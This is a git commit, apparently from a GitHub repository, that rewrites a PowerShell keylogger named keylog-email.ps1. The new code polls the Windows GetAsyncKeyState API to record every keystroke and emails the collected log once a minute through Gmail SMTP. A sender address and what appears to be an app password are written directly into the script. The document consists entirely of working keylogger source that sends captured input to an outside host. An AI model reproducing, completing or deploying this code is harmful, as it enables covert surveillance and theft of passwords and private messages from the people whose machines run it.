2137ef8ed261a198f5646c7de674c3ce9440fb71
DriverUmm <143862452+DriverUmm@users.noreply.github.com>
2025-05-16 21:35:47 -0300

    Adiciona keylog-email.ps1

--- keylog-email.ps1
+++ keylog-email.ps1
@@ -1,19 +1,28 @@
 
-Add-Type -AssemblyName System.Windows.Forms
+Add-Type -TypeDefinition @"  [DllImport("user32.dll")]
+  public static extern short GetAsyncKeyState(int vKey);
+"@ -Name Win32 -Namespace Native
+
 $smtpServer='smtp.gmail.com';$smtpPort=587;$smtpUser='driiverr1@gmail.com';$smtpPass='gfpu dqgk wzfg sxgm';
 $from='driiverr1@gmail.com';$to='driiverr1@gmail.com';
 $global:Log='';
-$timer=New-Object Timers.Timer(60000);$timer.AutoReset=$true;$timer.add_Elapsed({
-  if($global:Log){
-    $msg=New-Object Net.Mail.MailMessage($from,$to,("Keylog "+(Get-Date)),$global:Log);
-    $smtp=New-Object Net.Mail.SmtpClient($smtpServer,$smtpPort);$smtp.EnableSsl=$true;
-    $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass);
-    $smtp.Send($msg);$global:Log=''
+
+function Send-Log { if (-not $global:Log) { return } try {
+  $msg=New-Object Net.Mail.MailMessage($from,$to,("Keylog "+(Get-Date)),$global:Log)
+  $smtp=New-Object Net.Mail.SmtpClient($smtpServer,$smtpPort)
+  $smtp.EnableSsl=$true;$smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass)
+  $smtp.Send($msg);$global:Log=''
+} catch { Add-Content -Path "$env:TEMP\keylog-error.txt" -Value $_.Exception.Message } }
+
+$timer=New-Object Timers.Timer(60 * 1000)
+$timer.AutoReset=$true
+$timer.add_Elapsed({ Send-Log })
+$timer.Start()
+
+while($true){
+  for($v=1;$v -le 254;$v++){
+    $st=[Native.Win32]::GetAsyncKeyState($v)
+    if($st -band 0x8000){ $ch=[char]$v; switch($ch){' '{ $global:Log+=' '} '`r'{ $global:Log+='[ENTER]`n'} default{ $global:Log+=$ch} } }
   }
-});$timer.Start();
-[System.Windows.Forms.Application]::AddMessageFilter(
-  New-Object Windows.Forms.IMessageFilter -ArgumentList {param($m)
-    if($m.Msg -eq 0x0101){ $ch=[char]$m.WParam;switch($ch){' '{$global:Log+=' '} ''{$global:Log+='[ENTER]`n'} default{$global:Log+=$ch}}}
-    return $false
-})
-while($true){Start-Sleep -Seconds 1}
+  Start-Sleep -Milliseconds 100
+}
